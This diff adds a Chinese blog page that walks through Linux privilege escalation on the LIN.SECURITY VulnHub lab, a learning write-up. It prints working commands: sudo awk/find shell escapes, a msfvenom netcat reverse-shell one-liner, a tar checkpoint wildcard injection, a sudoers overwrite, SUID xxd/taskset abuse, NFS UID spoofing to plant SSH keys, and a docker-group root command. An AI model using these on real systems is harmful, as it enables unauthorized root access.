@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta name="author" content="FengHLZ">
+  
+  
+  <title>提权知识学习-LIN.SECURITY靶场 | xyz|All</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="提权知识,">
+  
+
+  
+  <meta name="description" content="学习Linux提权知识的靶场">
+
+  
+
+  <script src="/js/av-min.js" async></script>
+
+  
+
+  
+    <script src="/js/Valine.min.js" async></script>
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"mB9CftyvuDc5gN6R44KukJtw-gzGzoHsz","appkey":"gRRwrnOXHglzMIz3blENWVJV","comment":true,"count":true},
+    welcome: {"enable":true,"interval":30},
+    start_time: "2018-07-09",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "FengHLZ",
+    share: {"twitter":true,"facebook":true,"weibo":true,"qq":true,"wechat":true},
+    mathjax: false,
+    page_type: ""
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+<script src="/js/jquery.min.js"></script>
+
+  
+    <link rel="icon" href="/images/siteimage.jpg">
+    <link rel="apple-touch-icon" href="/images/siteimage.jpg">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">FengHLZ.xyz</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | Know it - Do it</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+        <a href="/friends/" target="_self">友链</a>
+      
+        <a href="/about/index.html" target="_self">关于</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/FengHLZ" target="_blank">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2020-02-22
+    </span>
+    
+      <span>
+        | <a href="/categories/提权知识/"><i class="fa fa-bookmark"></i>提权知识</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    提权知识学习-LIN.SECURITY靶场
+  </h1>
+  
+  <article class="passage-article">
+    <p>靶场地址：<a href="https://www.vulnhub.com/entry/linsecurity-1,244/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/linsecurity-1,244/</a></p>
+<p>低权限用户：<code>bob:secret</code></p>
+<p>此靶场为<strong>Linux 配置问题导致提权</strong></p>
+<h2 id="靶机设置"><a href="#靶机设置" class="headerlink" title="靶机设置"></a>靶机设置</h2><h3 id="修改默认键盘布局"><a href="#修改默认键盘布局" class="headerlink" title="修改默认键盘布局"></a>修改默认键盘布局</h3><p>该靶机的默认键盘布局不是美式的，敲击<code>|</code>会出现<code>~</code></p>
+<p>首先运行命令：<code>sudo awk &#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;</code>（<code>&quot;</code>布局改变了，多试几个），<strong>提升为root用户</strong>，方便后面的修改配置文件。</p>
+<p>修改配置文件：<code>sudo vim /etc/default/keyboard</code>，将里面的<code>XKBLAYOUT</code>变量的值改为<code>us</code>，然后在文字终端（ctrl+Alt+F2那种）运行：<code>setupcon</code></p>
+<h3 id="配置网卡"><a href="#配置网卡" class="headerlink" title="配置网卡"></a>配置网卡</h3><p>Ubuntu 18通过<code>netplan</code>设置网络。</p>
+<p>同上，先提权到root用户。</p>
+<p><code>ifconfig -a</code>看到有一块<code>ens33</code>的网卡，但是没有生效。</p>
+<p><code>sudo vim /etc/netplan/50-cloud-init.yaml</code>：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221155727.png" alt></p>
+<p>将<code>enp0s3</code>改为<code>ens33</code>，<code>sudo netplan apply</code>重启网络</p>
+<h2 id="简单信息搜集"><a href="#简单信息搜集" class="headerlink" title="简单信息搜集"></a>简单信息搜集</h2><h3 id="检测当前用户权限"><a href="#检测当前用户权限" class="headerlink" title="检测当前用户权限"></a>检测当前用户权限</h3><p><code>whoami</code>  <code>id</code></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200219210332.png" alt></p>
+<h3 id="查看系统的发行版本和内核版本"><a href="#查看系统的发行版本和内核版本" class="headerlink" title="查看系统的发行版本和内核版本"></a>查看系统的发行版本和内核版本</h3><p><code>lsb_release -a</code></p>
+<p><code>uname -a</code></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200219210411.png" alt></p>
+<h3 id="查看运行的服务及安装的程序"><a href="#查看运行的服务及安装的程序" class="headerlink" title="查看运行的服务及安装的程序"></a>查看运行的服务及安装的程序</h3><h2 id="1-sudo-提权"><a href="#1-sudo-提权" class="headerlink" title="1. sudo  提权"></a>1. sudo  提权</h2><p><strong>关于sudo命令</strong>：</p>
+<p>sudo权限是root把本来只能超级用户执行的命令<strong>赋予普通用户执行</strong></p>
+<p>要配置sudo，具体是修改<code>/etc/sudoers</code></p>
+<p><strong>提权姿势</strong>：</p>
+<p>采用<code>sudo -l</code>这个命令来<strong>查看自己是否有sudo配置</strong></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200219213139.png" alt></p>
+<p>拥有sudo的<code>ash</code>、<code>awk</code>等权限</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200219213232.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200219213332.png" alt></p>
+<p><code>find</code>命令也可提权：<code>find . -exec /bin/sh \; -quit</code></p>
+<p><strong>在线查询sudo的提权命令</strong>：<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p>
+<h2 id="2-etc-passwd的哈希"><a href="#2-etc-passwd的哈希" class="headerlink" title="2. /etc/passwd的哈希"></a>2. /etc/passwd的哈希</h2><p>linux的用户密码哈希存储在<code>/etc/shadow</code>文件，<strong>普通用户</strong>能够查看到的则是<code>/etc/passwd</code>这个文件</p>
+<p>在<code>/etc/passwd</code>中，比如：<code>root:x:0:0:root:/root:/bin/bash</code>。账户的<strong>第二列</strong>是密码哈希，如果该列为<code>x</code>则代表密码哈希存储在<code>/etc/shadow</code>文件上</p>
+<h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h3><p><strong>普通用户权限能够查看</strong></p>
+<p>保存用户信息，每一行代表一个用户，每一行通过冒号<code>:</code>分为七个部分</p>
+<ol>
+<li>用户名</li>
+<li>密码，x表示密码保存在<code>/etc/shadow</code></li>
+<li>UID，0代表root</li>
+<li>GID，表示所在组</li>
+<li>描述信息，依次为<code>Full Name</code>、<code>Room Number</code>、<code>Work Phone</code>、<code>Home Phone</code>和<code>Other</code></li>
+<li>用户主目录</li>
+<li>默认shell类型</li>
+</ol>
+<p><strong>eg.</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test2:x:1001:1001:test2,11111,111111-11,222222-22,test:/home/test2:/bin/bash</span><br></pre></td></tr></table></figure>
+<ul>
+<li>用户名：test2</li>
+<li>密码保存在<code>/etc/shadow</code></li>
+<li>UID为<code>1001</code></li>
+<li>GID为<code>1001</code></li>
+<li>描述信息：<code>Full Name []: test2  Room Number []: 11111  Work Phone []: 111111-11  Home Phone []: 222222-22  Other []: test</code></li>
+<li>用户主目录为<code>/home/test2</code></li>
+<li>默认shell为<code>/bin/bash</code></li>
+</ul>
+<h3 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h3><p><strong>只有root用户权限能够查看</strong></p>
+<p>保存加密后的密码和用户的相关密码信息，每一行代表一个用户，每一行通过冒号<code>:</code>分为九个部分</p>
+<ol>
+<li>用户名</li>
+<li>加密后的密码</li>
+<li>上次修改密码的时间(从1970.1.1开始的总天数)</li>
+<li>两次修改密码间隔的最少天数，如果为0，则没有限制</li>
+<li>两次修改密码间隔最多的天数,表示该用户的密码会在多少天后过期，如果为99999则没有限制</li>
+<li>提前多少天警告用户密码将过期</li>
+<li>在密码过期之后多少天禁用此用户</li>
+<li>用户过期日期(从1970.1.1开始的总天数)，如果为0，则该用户永久可用</li>
+<li>保留</li>
+</ol>
+<p><strong>注：</strong></p>
+<p>参数说明可通过<code>man shadow</code>获取</p>
+<p><strong>eg.</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test2:$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0:17470:0:99999:7:::</span><br></pre></td></tr></table></figure>
+<ul>
+<li>用户名：test2</li>
+<li>加密后的密码：<code>$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0</code></li>
+<li>上次修改密码的时间(从1970.1.1开始的总天数为17470)</li>
+<li>两次修改密码间隔：没有限制</li>
+<li>两次修改密码间隔最多的天数：没有限制</li>
+<li>提前7天警告用户密码将过期</li>
+<li>该用户永久可用</li>
+</ul>
+<p>由示例可知，<strong>加密的密码具有固定格式</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id$salt$encrypted</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p><code>id</code>表示<strong>加密算法</strong>，<code>1</code>代表<code>MD5</code>，<code>5</code>代表<code>SHA-256</code>，<code>6</code>代表<code>SHA-512</code></p>
+</li>
+<li><p><code>salt</code>为盐值,系统随机生成</p>
+</li>
+<li><p><code>encrypted</code>表示密码的<code>hash值</code></p>
+</li>
+</ul>
+<h3 id="靶机提权演示"><a href="#靶机提权演示" class="headerlink" title="靶机提权演示"></a>靶机提权演示</h3><p>查看<code>/etc/passwd</code>文件：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221142135.png" alt></p>
+<p><code>insecurity</code>用户，<code>uid</code>和<code>gid</code>均为0（root），并且已经显示了密码的hash。</p>
+<p><code>cmd5</code>尝试破解：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221142248.png" alt></p>
+<p>收费，试试<code>somd5</code>：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221142310.png" alt></p>
+<p>进行提权：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221142540.png" alt></p>
+<h3 id="破解用户密码hash的常用工具和方法"><a href="#破解用户密码hash的常用工具和方法" class="headerlink" title="破解用户密码hash的常用工具和方法"></a>破解用户密码hash的常用工具和方法</h3><h4 id="在线网站查询"><a href="#在线网站查询" class="headerlink" title="在线网站查询"></a>在线网站查询</h4><p><a href="https://cmd5.com" target="_blank" rel="noopener">https://cmd5.com</a></p>
+<p><a href="https://www.somd5.com/" target="_blank" rel="noopener">https://www.somd5.com/</a></p>
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p><strong>John the Ripper</strong> 和 <strong>hashcat</strong></p>
+<p>Kali2.0集成了<code>John the Ripper</code>和<code>hashcat</code></p>
+<p><a href="https://klionsec.github.io/2017/04/26/use-john/" target="_blank" rel="noopener">https://klionsec.github.io/2017/04/26/use-john/</a></p>
+<p><a href="https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/" target="_blank" rel="noopener">https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/</a></p>
+<p><strong>mimipenguin</strong></p>
+<p><a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="noopener">https://github.com/huntergregal/mimipenguin</a></p>
+<p>原理类似于<code>mimikatz</code>，通过内存导出明文密码</p>
+<h2 id="3-利用定时任务cron以及通配符"><a href="#3-利用定时任务cron以及通配符" class="headerlink" title="3. 利用定时任务cron以及通配符"></a>3. 利用定时任务cron以及通配符</h2><p><strong>crontab文件格式</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">基本格式 :</span><br><span class="line"> *　　*　　*　　*　　*　　command</span><br><span class="line"> 分　 时　 日　 月　 周　 命令</span><br></pre></td></tr></table></figure>
+<p>第1列表示分钟1～59 每分钟用<em>或者 </em>/1表示<br>第2列表示小时1～23（0表示0点）<br>第3列表示日期1～31<br>第4列表示月份1～12<br>第5列标识号星期0～6（0表示星期天）<br>第6列要运行的命令</p>
+<p><strong>eg</strong>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">30 21 * * * /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每晚的21:30重启apache。</span><br><span class="line"></span><br><span class="line">45 4 1,10,22 * * /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每月1、10、22日的4 : 45重启apache。</span><br><span class="line"></span><br><span class="line">10 1 * * 6,0 /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每周六、周日的1 : 10重启apache。</span><br></pre></td></tr></table></figure>
+<p>查看/etc/crontab的定时任务会<strong>产生一些有趣的结果</strong></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221144805.png" alt></p>
+<p>查看<code>/etc/cron.daily/backup</code>文件：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221165016.png" alt></p>
+<p>这个定时任务的执行权限是root，将用户家目录下的文件备份到<code>/etc/backups/</code>下，<strong>使用通配符<code>*</code></strong></p>
+<p>利用通配符进行Linux本地提权：<a href="https://blog.csdn.net/qq_27446553/article/details/80943097" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/80943097</a></p>
+<p><strong>反弹shell</strong>：</p>
+<p>使用<code>msfvenom</code>生成<strong>nc反弹shell一句话</strong>（直接print到终端）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=127.0.0.1 lport=8888 R</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>-p</code>：payload</li>
+<li><code>R</code>：RAWAW原始数据</li>
+</ul>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221170056.png" alt></p>
+<p>将次payload写入<code>shell.sh</code>，并赋予执行权限：（在<strong>tar处理的目录下</strong>写入shell.sh）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;mkfifo /tmp/jvenbd; nc 127.0.0.1 8888 0&lt;/tmp/jvenbd | /bin/sh &gt;/tmp/jvenbd 2&gt;&amp;1; rm /tmp/jvenbd&quot; &gt; shell.sh &amp;&amp; chmod +x shell.sh</span><br></pre></td></tr></table></figure>
+<p>再创建两个文件：<code>--checkpoint-action=exec=sh shell.sh</code> 和 <code>--checkpoint=1</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;</span><br><span class="line">echo &gt; &quot;--checkpoint=1&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221170528.png" alt></p>
+<p>接着<code>nc -lp 8888 -vv</code>开启本地监听，等待定时任务的反弹连接：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221170933.png" alt></p>
+<p>实际上，<strong>定时任务执行的命令</strong>为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -zcf /etc/backups/home-bob.tgz *</span><br><span class="line">|</span><br><span class="line">|-&gt;</span><br><span class="line">	tar -zcf /etc/backups/home-bob.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>--checkpoint-action</code>选项：用于指定<strong>到达检查点时将要执行的程序</strong>，这将允许我们运行一个任意的命令。</li>
+</ul>
+<p>因此，选项<code>--checkpoint=1</code> 和 <code>--checkpoint-action=exec=sh shell.sh</code><strong>作为命令行选项</strong>交给了tar程序。</p>
+<p><strong>直接修改<code>/etc/sudoers</code>文件</strong>：</p>
+<p><code>echo &#39;echo &quot;ignite ALL=(root) NOPASSWD: ALL&quot; &gt; /etc/sudoers&#39; &gt;shell.sh</code></p>
+<h2 id="4-利用隐藏文件"><a href="#4-利用隐藏文件" class="headerlink" title="4. 利用隐藏文件"></a>4. 利用隐藏文件</h2><p>有时候<strong>隐藏文件</strong>会存放一些重要的信息，比如我们<strong>搜索home目录下的所有隐藏文件</strong>，并用ls -al显示出来。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name ".*" -type f -path "/home/*" -exec ls -al &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><code>-ipath p</code>, <code>-path p</code>：<strong>路径名称符合 p</strong> 的文件，ipath 会忽略大小写</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221174037.png" alt></p>
+<p>查看该文件，是susan用户的密码：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221174144.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221174234.png" alt></p>
+<h2 id="5-利用SUID"><a href="#5-利用SUID" class="headerlink" title="5. 利用SUID"></a>5. 利用SUID</h2><p>SUID这个是<code>uid +s</code>的组合，s指的是<strong>特殊权限</strong>。一般情况下，用户的权限是3位，比如<code>0755</code>这样的，<strong>特殊权限默认没有配置</strong>，但是如果超级管理员<strong>希望用户在执行一些特殊权限文件时，拥有root的权限</strong>，就会配置特殊权限。</p>
+<p>比如说<code>passwd</code>这个命令，这个命令会修改<code>/etc/shadow</code>文件，而<code>/etc/shadow</code><strong>只有root才能修改</strong>，本来passwd这个命令应该也只能root才能执行的。但是<strong>系统为了让普通用户能够修改自己的密码</strong>，对<code>passwd</code>这个命令<strong>赋予了特殊权限</strong>并添加了只能修改自己密码的限制。</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003056.png" alt></p>
+<p>由于<code>passwd</code>这个命令是<strong>做过限制</strong>的，所以<strong>赋予特殊权限是没有问题</strong>的，但是如果系统超级用户特殊权限乱用，就会导致提权的问题。</p>
+<p><strong>使用如下命令快速查找所有SUID文件</strong>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -type f -exec ls -la &#123;&#125; 2&gt;/dev/null \;</span><br></pre></td></tr></table></figure>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003224.png" alt></p>
+<p>命令文件，<code>xxd</code>的作用是<strong>将一个文件以16进制的形式显示出来</strong>。他<strong>被配置了特殊权限</strong>，并且用户组为<code>itservices</code>是拥有执行权限x的。</p>
+<p>一旦<strong>suid</strong>和<strong>执行权限</strong>在一起就可能导致权限提升！</p>
+<p>通过命令查看发现<code>susan</code>这个用户属于<code>itservices</code>这个用户组。</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003500.png" alt></p>
+<p>用它来查看<code>/etc/shadow</code>这个文件，更多利用方法可以参考<a href="https://gtfobins.github.io/gtfobins/xxd/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/xxd/</a></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003704.png" alt></p>
+<p>还发现了一个<strong>其他用户拥有执行权限</strong>的SUID文件，这个文件<strong>不限用户</strong>，所以危害更大。</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003834.png" alt></p>
+<p>参考<a href="https://gtfobins.github.io/gtfobins/taskset/#suid-enabled" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/taskset/#suid-enabled</a></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003953.png" alt></p>
+<h2 id="6-NFS低权限访问"><a href="#6-NFS低权限访问" class="headerlink" title="6. NFS低权限访问"></a>6. NFS低权限访问</h2><p>用<code>nmap</code>扫一下目标靶机，看看开放的服务：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222120320.png" alt></p>
+<p>看到开放<code>2049</code>端口，对应<code>nfs</code>服务。</p>
+<p>NFS(<code>Network File System</code>)即<strong>网络文件系统</strong>，它<strong>允许网络中的计算机之间通过TCP/IP网络共享资源</strong>。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。</p>
+<p>在kali上<strong>安装nfs客户端工具</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nfs-common</span><br></pre></td></tr></table></figure>
+<p>安装完之后，可以使用<code>showmount</code>命令检索<strong>给定主机的导出文件夹列表</strong>。</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222143147.png" alt></p>
+<p>账号peter的家目录可以被挂载：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222143216.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222143235.png" alt></p>
+<p>可以看到，挂载好的peter的家目录，显示的文件的<strong>所有者</strong>和<strong>所属组</strong>分别为<code>1001</code>和<code>1005</code></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222143654.png" alt></p>
+<p>尝试在这个家目录里面<strong>创建一个文件</strong>：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222143950.png" alt></p>
+<p>权限不够。</p>
+<p>即使我们在kali攻击机上是root用户，但是我们还是没有写入权限，因为<strong>默认情况下客户端的root身份会被主动压缩成匿名者</strong>。</p>
+<p><strong>可以伪造文件所有者的UID和GID来欺骗NFS服务器</strong>，创建一个gid为1005的用户组，接着创建peter这个账户uid指定为1001，gid指定为1005。</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222144218.png" alt></p>
+<p>再看看<code>/mnt/peter</code>下的文件所有者：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222144321.png" alt></p>
+<p>但现在还是以客户端的root登录，服务端默认为匿名者。</p>
+<p>切换客户端用户为<code>peter</code>，服务端也认为是存在的用户<code>peter</code></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222144513.png" alt></p>
+<p>可以写文件了，如此，可以<strong>写入ssh公钥文件</strong>（先使用<code>ssh-keygen</code>生成公私钥对）：</p>
+<p>首先创建服务器上的<code>.ssh</code>目录，写入公钥：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222144739.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222145125.png" alt></p>
+<p>使用私钥登录：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222145227.png" alt></p>
+<h2 id="7-利用docker组提权"><a href="#7-利用docker组提权" class="headerlink" title="7. 利用docker组提权"></a>7. 利用docker组提权</h2><p>从上面那张图，看到<code>peter用户</code>也属于<code>docker组</code></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222150634.png" alt></p>
+<p>如果是docker组的成员，那么可以根据此漏洞来<strong>获取root的shell</strong></p>
+<p>具体参考：<a href="https://fosterelli.co/privilege-escalation-via-docker.html" target="_blank" rel="noopener">https://fosterelli.co/privilege-escalation-via-docker.html</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br></pre></td></tr></table></figure>
+<p>可以先配置使用阿里云的镜像</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222151859.png" alt></p>
+<p>镜像的具体代码可以查看：<a href="https://github.com/chrisfosterelli/dockerrootplease" target="_blank" rel="noopener">https://github.com/chrisfosterelli/dockerrootplease</a></p>
+<h2 id="8-systemd配置"><a href="#8-systemd配置" class="headerlink" title="8. systemd配置"></a>8. systemd配置</h2><h3 id="systemd是什么"><a href="#systemd是什么" class="headerlink" title="systemd是什么"></a>systemd是什么</h3><p>历史上，<a href="http://www.ruanyifeng.com/blog/2013/08/linux_boot_process.html" target="_blank" rel="noopener">Linux 的启动</a>一直采用<a href="https://en.wikipedia.org/wiki/Init" target="_blank" rel="noopener"><code>init</code></a>进程。</p>
+<p>下面的命令用来启动服务。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo /etc/init.d/apache2 start</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ service apache2 start</span><br></pre></td></tr></table></figure>
+<p>这种方法有两个缺点。</p>
+<p>一是启动时间长。<code>init</code>进程是串行启动，只有前一个进程启动完，才会启动下一个进程。</p>
+<p>二是启动脚本复杂。<code>init</code>进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使得脚本变得很长。</p>
+<p>Systemd 就是为了解决这些问题而诞生的。它的设计目标是，<strong>为系统的启动和管理提供一套完整的解决方案</strong>。</p>
+<p>使用了 <code>Systemd</code>，就不需要再用<code>init</code>了。<code>Systemd</code> 取代了<code>initd</code>，成为系统的第一个进程（PID 等于 1），其他进程都是它的子进程。</p>
+<p>Systemd 并不是一个命令，而是<strong>一组命令</strong>，涉及到<strong>系统管理的方方面面</strong>。</p>
+<ul>
+<li><p><code>systemctl</code>是 Systemd 的主命令，用于管理系统。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重启系统</span></span><br><span class="line">$ sudo systemctl reboot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭系统，切断电源</span></span><br><span class="line">$ sudo systemctl poweroff</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>systemd-analyze</code>命令用于查看启动耗时。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看启动耗时</span></span><br><span class="line">$ systemd-analyze                                                                     </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看每个服务的启动耗时</span></span><br><span class="line">$ systemd-analyze blame</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>hostnamectl</code>命令用于查看当前主机的信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示当前主机的信息</span></span><br><span class="line">$ hostnamectl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置主机名。</span></span><br><span class="line">$ sudo hostnamectl <span class="built_in">set</span>-hostname rhel7</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
